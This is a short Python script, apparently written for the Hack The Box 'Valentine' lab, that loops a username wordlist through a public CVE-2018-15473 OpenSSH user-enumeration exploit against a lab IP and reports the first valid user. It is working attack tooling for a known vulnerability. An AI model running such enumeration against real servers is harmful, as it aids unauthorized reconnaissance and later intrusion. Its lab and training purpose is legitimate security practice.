#!/usr/bin/env python3
# This script is a method to use a user dictionary with the CVE-2018-15473 SSH User Enumeration by Leap Security (@LeapSecurity) https://leapsecurity.io
# Developed to solve Valentine HTB machine

from pwn import *
import os

def user_enumeration(diccionario,progress):
    for i in diccionario:
        progress.status(f'Working with user {i}')
        if os.system(f'python3 45939.py 10.10.10.79 {i}') == 0: #Change: python3 <archivo.py> <target>
            return progress.success(f'Valid user: {i}')


progress = log.progress('Info')
context.log_level = '1'
diccionario = open('../files/usr.txt') #Change for other dictionary if needed
user_enumeration(diccionario,progress)

